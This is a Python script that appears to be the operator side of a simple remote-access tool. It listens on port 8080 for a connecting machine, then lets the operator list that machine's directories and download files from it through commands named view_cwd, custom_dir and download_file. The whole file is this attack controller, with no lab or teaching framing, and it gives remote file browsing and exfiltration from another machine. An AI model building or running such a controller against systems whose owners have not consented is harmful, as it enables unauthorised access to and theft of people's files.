import os 
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
print("")
print("Server is currently running @ ", host)
print("")
print("Waiting for any incoming connections...")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr," has connected to the server succesfully")

while 1:
    print("")
    command = input(str("Command >> "))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command sent! Awaiting execution!")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output : ", files)
    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir : "))
        conn.send(user_input.encode())
        print("")
        print("Command sent! Awaiting execution!")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output : ", files)
    elif command == "download_file":
        conn.send(command.encode())
        print("")
        filepath = input(str("Please enter FILE PATH and FILE NAME : "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        print("")
        filename = input(str("Please input incoming file name and ext. : "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, " has been downloaded!")
        print("")

    else:
        print("")
        print("Invalid command!")